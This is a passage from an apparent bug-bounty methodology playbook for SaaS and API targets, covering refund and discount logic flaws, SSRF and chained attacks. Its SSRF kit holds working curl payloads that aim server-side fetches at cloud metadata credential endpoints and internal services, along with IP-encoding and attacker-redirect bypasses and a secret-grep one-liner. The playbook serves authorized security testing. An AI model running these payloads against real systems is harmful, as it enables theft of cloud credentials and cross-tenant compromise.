  -d '{"amount":100,"currency":"IDR"}' "$BASE/topup" | jq '{credited,currency}'
```

**Observed-state / readback step.** Proof = an economic invariant is violated on a read-back: cart `total` is negative or below the legitimate floor after stacking; a refund of more than was paid is recorded (`refund_amount > order_amount`, both read from the API); an order shows `status: shipped` with `paid: false`; the trial is active past its window. Live = the policy-violating state persists and is readable; patched = the second coupon is rejected / refund capped at paid amount / state transition refused. Quantify against the legitimate value (catalog price, amount paid, configured limit).

**Instance example (illustrative).** Refund endpoint refunds the *requested* amount, not the captured amount. `POST /refunds {order_id, amount: 10x_paid}` records a refund larger than the charge; `GET /orders/{id}` shows `refunded: 5000, paid: 500`. Loss = `refunded − paid`. (Constructed; classic refund-amount-not-bound bug.)

**Generalization.** Map every quantity the business cares about and ask "what bounds it, and where is that bound enforced?": discounts (stack/floor), refunds (cap to paid), credits/cashback, referral payouts, inventory/seats, rate limits (per what dimension?), trial/grace windows, currency conversion, fee calculation. Also multi-step workflows where an intermediate guard is the only thing preventing a skip. Highest value: a path that creates money/credit from nothing or refunds more than paid.

---

## V10 -- SSRF / server-side request handling

**What it is.** A feature lets the user influence a URL the *server* fetches: webhook callback registration, "import from URL," avatar/PDF/screenshot fetchers, link unfurlers, OAuth/OIDC discovery URLs, SAML metadata, integration callbacks. The product dev built a convenience feature; the platform/infra team owns the network the server sits on (cloud metadata, internal services, the database, other tenants' internal endpoints). Seam: outbound request validation is a security concern the product feature created and the platform team never scoped.

**Detection kit.**
```bash
# 1) Find URL-accepting fields: webhook urls, import endpoints, image/pdf fetchers, integrations.
#    Point them at a collaborator first to prove the server fetches (interactsh / Burp Collaborator):
#    interactsh-client -> get a domain like abcd.oast.fun
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
  -d '{"url":"http://abcd.oast.fun/ssrf-probe"}' "$BASE/integrations/webhook" -w '\n%{http_code}\n'
# (watch the collaborator for the inbound hit + its source IP -- proves server-side fetch)
# 2) Escalate to cloud metadata (AWS IMDSv1 / GCP / Azure) and internal services:
#    NOTE: GCP requires header `Metadata-Flavor: Google`, AWS IMDSv2 requires a PUT-token first.
#    These headers travel on the SSRF SINK's outbound request, not your curl. So:
#      - IMDSv1 (no header): the plain GET below works if v1 is enabled.
#      - IMDSv2 / GCP: only exploitable if the sink lets you control request headers/method
#        (e.g. a "custom webhook headers" feature) OR follows a redirect you control that re-adds them.
#        If the sink is GET-only and header-fixed, a 401/403 from GCP/IMDSv2 is NOT a clean negative -- note it.
for u in \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  "http://169.254.169.254/latest/api/token" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  "http://localhost:6379/" "http://127.0.0.1:8500/v1/agent/self" "http://[::1]:5432/" ; do
  curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
    -d "{\"url\":\"$u\"}" "$BASE/import" | head -c 400; echo " <= $u"
done
# IMDSv2 two-step (only if the sink supports PUT + custom headers, or via a header-reflecting redirect):
#   PUT http://169.254.169.254/latest/api/token  with  X-aws-ec2-metadata-token-ttl-seconds: 21600
#   then GET .../meta-data/... with  X-aws-ec2-metadata-token: <token>
# Azure IMDS requires header  Metadata: true  (same sink-controls-headers caveat).
# 3) Bypass weak allowlists/blocklists: DNS rebinding, decimal/octal/IPv6 of 169.254.169.254, redirect chains.
#    169.254.169.254 == 2852039166 (decimal) == 0xA9FEA9FE; or http://attacker/redirect->metadata
curl -sS -X POST -H "Authorization: Bearer $TOK_A" -H 'Content-Type: application/json' \
  -d '{"url":"http://2852039166/latest/meta-data/"}' "$BASE/import" | head -c 400
# 4) Protocol smuggling: file://, gopher:// (Redis/Postgres), dict://; and blind SSRF via response-time delta.
# 5) Webhook SSRF that returns the fetched body to you (full-read SSRF) vs blind (collaborator only).
```

**Observed-state / readback step.** Proof (blind) = the collaborator records an inbound request originating from the *server's* egress IP after you submit the URL -- observed network event, not argument. Proof (full-read) = the fetched body of an internal-only resource is returned to you (e.g., the response contains an IMDS credential blob or an internal service banner you could not reach directly). Live = collaborator hit / internal body returned; patched = request blocked, allowlist enforced, or only the public resource fetched. For credential theft, immediately read-back by *using* the leaked credential against the cloud API in your own session (proves it is live), but stop at proof -- do not pivot into infrastructure beyond the minimum.

**Instance example (illustrative).** A "screenshot this URL" feature fetches arbitrary URLs server-side. Submitting `http://169.254.169.254/latest/meta-data/iam/security-credentials/role-x` returns temporary AWS credentials in the rendered output. Readback: `aws sts get-caller-identity` with those creds returns the role ARN, confirming live SSRF-to-credential. (Constructed; the canonical metadata-SSRF chain.)

**Generalization.** Every server-initiated fetch is a candidate: webhooks, importers, PDF/image/screenshot renderers, link previews/unfurlers, OAuth/OIDC `.well-known` discovery, SAML `AssertionConsumerServiceURL`/metadata, SSO IdP-initiated URLs, payment/notification callbacks, "verify domain" TXT/HTTP checks, and any field that becomes a URL downstream. Also check XXE in XML/SAML uploads as an SSRF primitive. Highest value: full-read SSRF to cloud metadata (credential theft) or to an internal admin service.

---

## Cross-vector amplifiers

Single vectors are findings; chains are criticals. On this surface the seam compounds: an auth-coverage hole reaches an object, an object yields a tenant, a tenant yields the business invariant.

- **V1 + V2 = THE KILLSHOT (the F1+W34 analogue).** An auth-matrix hole (unauth or low-priv reaches a route/verb) **plus** an object-level-authz gap on the object that route touches = an anonymous or low-privilege actor performs a cross-tenant or privileged action. This is the direct generalization of upshift's F1 (GET authed / POST not) feeding a privileged operation: under-authed trigger × object the trigger can reach × no object-scope check = privileged action by an actor who should not have it. **Name it: the Coverage-Hole-to-Object chain.** Always try to land V1's anon/low-priv finding *on V2's foreign object* before writing either up separately -- the chain is worth multiples of the parts.
- **V4 + V1 = self-escalate-then-walk-in.** Mass-assignment writes `role:admin` (V4), then the V1 matrix's admin routes (previously 403) now return 200 for the same token. The persisted role is the bridge; re-run the V1 sweep with the escalated token to enumerate the new blast radius.
- **V4 + V3 = tenant reassignment.** Mass-assign a foreign key (`tenant_id` / `owner_id`) to move an object you own into tenant B, or to claim B's object into your tenant. Converts a field-write into full cross-tenant access. Confirm with B's account.
- **V5 + V8 = free money, repeatedly.** Client-trusted price (V5) sets cost to 0.01, then the missing idempotency/race contract (V8) lets you fire it concurrently -- combine an under-priced op with an N× replay for compounding loss. Read the wallet/order ledger to quantify `(N) × (list_price − charged)`.
- **V10 → V7 = SSRF to auth-key/secret to forged admin.** Full-read SSRF (V10) reaches an internal JWKS, signing key, or secrets endpoint; the leaked key forges an admin token (V7) accepted by the API. SSRF becomes total auth compromise.
- **V6 + V8 = batched race.** GraphQL array-batching/aliases (V6) puts N copies of a money-moving mutation in a single request, sharpening the race window of V8 to a single-packet attack and bypassing per-request rate limits at once.

**Surface killshot statement:** *under-authed trigger (auth-matrix hole) + an object/tenant the trigger can reach = a cross-tenant or privileged action by an anonymous/low-priv actor.* If a chain you build does not end in "an actor who should not, did, to data/funds that were not theirs, and the re-read proves it," it is not yet the killshot.

---

## Expansion sub-pass hints (specialization of HUNT-METHODOLOGY.md Pass 2)

How the universal Pass 2 sub-passes specialize on Web2/SaaS/API. (Pass mechanics live in HUNT-METHODOLOGY.md; this is only the surface-specific lens.)

- **2A authority-chain.** Trace the full chain from request to decision: gateway/WAF → auth middleware → route handler → service layer → data-access layer. Find every place the *tenant/owner* is read from the *request* (header/param/body/claim) instead of *derived from the verified session*. Map which handlers go through the middleware and which are registered on a second router (legacy v1, internal, admin, webhook receiver). The authority chain breaks wherever a handler reads identity from input or sits on an ungated router -- that is V1/V2/V3 territory.
- **2B secret hygiene.** Sweep the SPA/mobile bundle and source maps for embedded secrets the client should never hold: API keys, admin/service tokens, signing keys, `*_SECRET`, hardcoded JWTs, Algolia/Stripe/Sentry/Segment keys. `curl $WEB/main.js | grep -Eo '(sk_live|AKIA|eyJ[A-Za-z0-9_-]{20,}|[A-Za-z0-9]{32,})'` and pull `.map` files; run `trufflehog filesystem` / `gitleaks` on a cloned frontend repo if public. Client-embedded server secrets are both a direct finding and the bridge for V5/V7.
- **2C privileged-actor-under-stress.** The privileged actors here are: support/impersonation tooling, the billing/webhook processor, the background job runner, the admin panel, the integration/partner API. Audit each under stress -- does impersonation exit cleanly (V7)? Does the webhook processor re-verify the tenant of the payload it replays (V3/V8)? Does a background export job apply the tenant scope the synchronous path applies (V3)? Privileged async actors are the least-reviewed and run *behind* the auth gate where the matrix sweep can't reach them.
- **2D shadow surface.** Enumerate the parallel surfaces the main route map misses: legacy API versions (`/v1` next to `/v2`), internal/admin subdomains, the mobile API (often a separate, older gateway), partner/integration endpoints, GraphQL alongside REST, gRPC reflection, webhook receivers, `.well-known/`, staging/canary hosts that share the prod database. `ffuf` version prefixes, `subfinder`/`amass` for subdomains, fingerprint each for its own (weaker) auth posture. Shadow surfaces are where V1 holes concentrate because they were "out of mind."
- **2E error/telemetry leak.** Trigger errors and read what leaks: stack traces with framework/version and file paths, SQL fragments (chains to SQLi -- see SQLI-HUNT-STRATEGY.md), internal hostnames/IPs, other-tenant ids in error messages, verbose 500s, GraphQL field-suggestion errors (V6 schema recovery), and debug endpoints (`/debug`, `/__debug__`, `/actuator`, `/metrics`, `/.env`). Differential errors are an authz oracle: a 403 on objects you can't see vs a 404 on nonexistent ones leaks which ids exist across tenants (refines V2/V3).

---

## Mirror pairs (this surface)

Pass 3's mirror-invariant audit (V_in vs V_out -- a file/handler is not "clean" without a written `in` vs `out` line) maps to these bidirectional pairs. For each, write the explicit `protected_on_X / protected_on_Y` line; an asymmetry is the finding.

- **Read vs Write on the same resource.** Is `GET /x/{id}` object-scoped but `POST/PATCH/DELETE /x/{id}` is not? (The F1 mirror -- V1/V2.) Write the line: "GET checks owner = caller; PATCH checks only authenticated."
- **REST vs GraphQL for the same action.** Same mutation reachable via REST (gated) and GraphQL (resolver-ungated), or vice-versa. (V1/V6.)
- **Sync API vs async worker.** The synchronous handler applies tenant scope / idempotency; the queue worker or webhook replayer that performs the same write does not. (V3/V8.)
- **Create vs Update vs Delete of a foreign-key field.** Create validates `tenant_id == caller`; update lets you reassign it (mass-assignment). (V4/V3.)
- **Charge vs Refund.** Charge is recomputed server-side from the catalog; refund trusts the client amount. (V5/V9.)
- **Issue vs Revoke of an auth artifact.** Token issuance is careful; logout/password-change/role-change does not revoke or rotate the old artifact. (V7.)
- **v1 legacy vs v2 current.** The new version added an authz check the old version still on the same router never got. (V1.)
- **Self vs Other in entitlement checks.** `read own profile` is scoped; `read profile by id` reuses a code path that forgot the `== self` clause. (V2.)

For each pair, the proof obligation is the same: demonstrate the protected side, then demonstrate the unprotected side returns/mutates real cross-principal data on re-read.

---

## Pointers to existing arsenal

Reference these; do not duplicate. Load the relevant one when a vector goes deep.

- **`~/arsenal/methodology/H1-HUNTING-PATTERNS.md`** -- the 47-pattern HackerOne pattern DB; the canonical web/API hacktivity patterns (BOLA, mass-assignment, SSRF, JWT, business logic) that V1-V10 systematize. First stop for "has this exact shape paid before, and how was it written up."
- **`~/Desktop/BUGS/WEB2-ON-SC-PROGRAMS-PLAYBOOK.md`** -- when the Web2/SaaS surface sits *on a smart-contract bounty program* (Cantina/C4/Sherlock/Immunefi with an off-chain component). The Polymarket #197 template lives here; critical for routing a web finding into an SC program's scope and severity model, and for the money-flow prefilter that decides if a web bug is in-scope at all.
- **`~/Desktop/BUGS/NEXTJS-HUNT-CHECKLIST.md`** -- when the target is a Next.js/React SPA + API-routes/server-actions/middleware stack (extremely common SaaS shape). Specializes V1 (middleware matcher gaps, route-handler vs server-action auth divergence), V4 (server-action arg binding), and 2D shadow surface (RSC payloads, `_next` internals).
- **`~/Desktop/BUGS/DEFI-FULLSTACK-CHECKLIST.md`** -- when the SaaS is the off-chain half of a DeFi product (the upshift gold-standard shape: backend signs on-chain txns from off-chain events). Bridges this pack's V5/V7/V8/V10 into the on-chain consequence (executor wallet, signing seam).
- **`~/arsenal/methodology/SQLI-HUNT-STRATEGY.md`** -- escalation path for 2E error leaks and any parameter that reaches a query. SQLi is frequently the deepest consequence of the same "input trusted by the data layer" seam that V3/V4 exploit; pivot here when error messages or filter params smell injectable.
- **`~/Desktop/BUGS/CRITICAL-HUNT-CHECKLIST.md`** -- the systematic fund-theft checklist; its business-logic/math-invariant section reinforces V9, and its money-flow framing keeps every finding anchored to a `loss = $X` line before it counts.